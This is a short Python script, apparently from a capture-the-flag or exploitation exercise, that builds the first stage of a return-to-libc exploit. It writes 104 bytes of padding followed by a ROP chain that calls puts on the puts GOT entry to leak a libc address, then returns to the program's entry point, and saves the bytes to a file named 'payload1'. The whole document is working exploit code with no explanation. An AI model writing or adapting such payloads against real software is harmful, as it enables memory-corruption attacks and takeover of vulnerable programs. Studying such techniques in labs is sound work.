#!/usr/bin/env python3

from struct import pack

payload = b'a' * 104

# puts(<puts@GLIBC_2.2.5>);
payload += pack("<Q", 0x401de3) # pop rdi ; ret
payload += pack("<Q", 0x404018) # <puts@GLIBC_2.2.5>
payload += pack("<Q", 0x401060) # <puts@plt>
payload += pack("<Q", 0x401090) # Entry point

with open("payload1", "wb") as f:
    f.write(payload)
